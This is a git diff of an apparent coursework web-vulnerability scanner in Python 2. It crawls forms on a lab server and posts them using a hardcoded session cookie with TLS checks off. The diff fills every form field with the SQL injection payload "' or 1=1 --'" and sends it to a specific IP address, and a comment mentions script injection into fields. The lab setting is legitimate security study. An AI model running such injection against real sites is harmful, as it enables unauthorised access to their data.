@@ -23,7 +23,7 @@ import os.path
 import re
 import urllib
 from urlparse import urlparse
-import jsonReader
+import requests
 # This is a global set that contains all the URL's crawled from the website.
 urls = set()
 
@@ -135,11 +135,14 @@ def getValidResponse(params, action, url,cookies):
 #####################################################################################################################
 # This method constructs a HTTP Post Request to submit the form to it
 def constructPostRequest(formInput,cookies,action):
-	header={'Cookie' :'cse591=kP047iYtubEZ6ZnMKmxO'}
-	request = urllib2.Request(action,urllib.urlencode(formInput),header)
-	response = urllib2.urlopen(request)
-	print response.info()
-	return response.read()
+	cookies = dict(cse591='kP047iYtubEZ6ZnMKmxO')
+	r = requests.post(action, data=formInput, verify=False,cookies=cookies)
+	#header={'Cookie' :'cse591=kP047iYtubEZ6ZnMKmxO'}
+	#request = urllib2.Request(action,urllib.urlencode(formInput),header)
+	#response = urllib2.urlopen(request)
+	print r.headers
+	print r.status_code
+	print r.text
 
 #####################################################################################################################
 # This method takes in a form to be filled and the url and inserts <scripts> into the fields.
@@ -178,9 +181,9 @@ def getSqlInjResponse(params, action, url, cookies ):
 	   action = parsedURL.scheme+"://"+parsedURL.netloc+action
     print action
     for param in params:
-	   values=param.split('::')
-	   if(values[0] != ""):
-		  formInput[values[0]]="' or 1=1 --'"
+	   #values=param.split('::')
+	   if(param != ""):
+		  formInput[param]="' or 1=1 --'"
     sqlInjResponse = constructPostRequest(formInput,cookies,action)
     return sqlInjResponse
 
@@ -217,7 +220,7 @@ def main():
     opener.addheaders.append(('Cookie', 'cse591=kP047iYtubEZ6ZnMKmxO'))
     cookies = "{'cse591':'kP047iYtubEZ6ZnMKmxO'}"   
     domain = "129.219.253.30:80" 
-    url = "https://129.219.253.30:80/"
+    url = "https://129.219.253.30:80/~level08/cgi-bin/index.php"
     # get all the urls from the webApplication
     system("rm items.json")
     system("rm crawledURLs.txt")
@@ -227,8 +230,10 @@ def main():
     for i in data:
         (action, params) = test(i)
         print action, params
-        validResponse = getValidResponse(params, action, url, cookies)
-        print validResponse
+        #validResponse = getValidResponse(params, action, url, cookies)
+        #print validResponse
+	validResponse1 = getSqlInjResponse(params, action, url, cookies)
+	print validResponse1
     # getAllURLs("https://129.219.253.30:80/", "https://129.219.253.30:80/", opener)
     #print("urls-extracted: ", urls)
     '''
